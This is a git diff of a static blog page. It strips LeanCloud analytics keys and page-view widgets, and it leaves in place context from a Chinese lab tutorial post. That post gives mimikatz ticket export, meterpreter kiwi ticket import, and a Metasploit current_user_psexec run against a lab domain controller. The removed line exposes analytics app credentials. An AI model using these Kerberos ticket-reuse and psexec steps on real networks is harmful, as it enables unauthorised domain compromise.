@@ -72,7 +72,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"idea-oss.github.io","root":"/","version":"1.9.1","typing":{"enable":true,"typeSpeed":100,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"0mPxzRPwogk31Fn10hTPyb1K-gzGzoHsz","app_key":"BUzND1EWjf6LGVsgj979UcGb","server_url":"https://0mpxzrpw.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+    var CONFIG = {"hostname":"idea-oss.github.io","root":"/","version":"1.9.1","typing":{"enable":true,"typeSpeed":100,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":"https://0mpxzrpw.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -238,14 +238,6 @@
 
     
     
-      
-        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
-          <i class="iconfont icon-eye" aria-hidden="true"></i>
-          <span id="leancloud-page-views"></span> 次
-        </span>
-        
-      
-    
   </div>
 
 
@@ -387,7 +379,7 @@
 <p>接下来进行格式转换,msf不支持bin文件导出，所以要用mimikatz文件进行格式转换.在mimikatz输入命令,导出kirbi格式文件</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kerberos::clist <span class="hljs-string">&quot;20210609221820_default_192.168.43.16_windows.kerberos_125881.bin&quot;</span> /export<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20210609222904133.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>比如现在有一个低权限shell<br><img src="https://img-blog.csdnimg.cn/20210609223517247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>输入 load kiwi 命令,然后输入”kerberos_ticket_use   &#x2F;root&#x2F;<a href="mailto:&#x30;&#x2d;&#48;&#48;&#x30;&#x30;&#48;&#48;&#48;&#48;&#45;&#100;&#x65;&#x31;&#x61;&#x79;&#64;&#x6b;&#114;&#98;&#x74;&#103;&#x74;&#45;&#68;&#x45;&#49;&#x41;&#x59;&#46;&#x43;&#x4f;&#77;&#x2e;&#x6b;&#105;&#x72;&#98;&#105;">&#x30;&#x2d;&#48;&#48;&#x30;&#x30;&#48;&#48;&#48;&#48;&#45;&#100;&#x65;&#x31;&#x61;&#x79;&#64;&#x6b;&#114;&#98;&#x74;&#103;&#x74;&#45;&#68;&#x45;&#49;&#x41;&#x59;&#46;&#x43;&#x4f;&#77;&#x2e;&#x6b;&#105;&#x72;&#98;&#105;</a>“命令，将票据导入，接着输入 background命令，切换到meterpreter后台,使用高票据进行测试</p>
+<p><img src="https://img-blog.csdnimg.cn/20210609222904133.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>比如现在有一个低权限shell<br><img src="https://img-blog.csdnimg.cn/20210609223517247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>输入 load kiwi 命令,然后输入”kerberos_ticket_use   &#x2F;root&#x2F;<a href="mailto:&#48;&#x2d;&#48;&#48;&#48;&#48;&#x30;&#48;&#x30;&#48;&#45;&#100;&#x65;&#49;&#97;&#121;&#64;&#x6b;&#x72;&#x62;&#x74;&#x67;&#x74;&#45;&#x44;&#x45;&#49;&#x41;&#89;&#46;&#x43;&#x4f;&#x4d;&#x2e;&#107;&#105;&#x72;&#x62;&#x69;">&#48;&#x2d;&#48;&#48;&#48;&#48;&#x30;&#48;&#x30;&#48;&#45;&#100;&#x65;&#49;&#97;&#121;&#64;&#x6b;&#x72;&#x62;&#x74;&#x67;&#x74;&#45;&#x44;&#x45;&#49;&#x41;&#89;&#46;&#x43;&#x4f;&#x4d;&#x2e;&#107;&#105;&#x72;&#x62;&#x69;</a>“命令，将票据导入，接着输入 background命令，切换到meterpreter后台,使用高票据进行测试</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/local/current_user_psexec<br><span class="hljs-built_in">set</span> technique psh<br><span class="hljs-built_in">set</span> rhosts DC.de1ay.com<br><span class="hljs-built_in">set</span> session 1<br></code></pre></td></tr></table></figure>
 
 <p>就会得到高权限</p>
@@ -622,31 +614,6 @@
     </div>
   
   
-    <div class="statistics">
-  
-  
-
-  
-    
-      <span id="leancloud-site-pv-container" style="display: none">
-        总访问量 
-        <span id="leancloud-site-pv"></span>
-         次
-      </span>
-    
-    
-      <span id="leancloud-site-uv-container" style="display: none">
-        总访客数 
-        <span id="leancloud-site-uv"></span>
-         人
-      </span>
-    
-    
-
-  
-</div>
-
-  
   
   
 </div>
@@ -703,8 +670,6 @@
 
   
 
-  
-    
   
 
 
@@ -849,8 +814,6 @@
   <script>Fluid.plugins.imageCaption();</script>
 
   <script  src="/js/local-search.js" ></script>
-
-  <script defer src="/js/leancloud.js" ></script>
 
 
 
